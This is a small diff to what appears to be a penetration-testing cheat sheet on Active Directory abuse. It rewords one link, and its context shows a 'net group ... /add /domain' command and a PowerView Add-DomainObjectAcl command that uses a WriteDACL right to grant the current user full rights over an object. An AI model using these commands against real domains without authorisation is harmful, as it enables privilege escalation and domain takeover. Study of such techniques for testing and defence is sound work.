@@ -106,7 +106,7 @@ net group testgroup <user> /add /domain
 ---
 &nbsp;
 <span style="font-size: 25px; color:white"><b>Abusing WriteDACL access right</b></span>
-After [enumerating all ACEs for all domain users](####Get-ObjectAcl), check for <span style="color:red">ActiveDirectoryRights : WriteDacl</span>.
+After Get-ObjectAcl (above), check for <span style="color:red">ActiveDirectoryRights : WriteDacl</span>.
 If you find any, that right allows us to add new access rights like GenericAll:
 ```powershell
 Add-DomainObjectAcl -TargetIdentity <CN_NAME> -PrincipalIdentity <CURRENT_USER> -Rights All
